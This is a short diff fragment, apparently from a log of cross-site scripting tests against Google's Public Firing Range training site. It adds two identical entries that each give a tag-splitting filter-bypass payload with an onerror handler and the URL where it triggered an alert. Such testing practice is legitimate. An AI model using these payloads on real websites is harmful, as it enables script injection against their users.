@@ -1,0 +1,10 @@
+16) 😈 Payload: </scrip</script>t><img src =q onerror=prompt(8)>  ==>  Alert message: 8 ✅
+
+ ===> URL: [https://public-firing-range.appspot.com/reflected/parameter/attribute_unquoted?q=</scrip</script>t><img src =q onerror=prompt(8)>]
+
+
+17) 😈 Payload: </scrip</script>t><img src =q onerror=prompt(8)>  ==>  Alert message: 8 ✅
+
+ ===> URL: [https://public-firing-range.appspot.com/reflected/parameter/attribute_unquoted?q=</scrip</script>t><img src =q onerror=prompt(8)>]
+
+
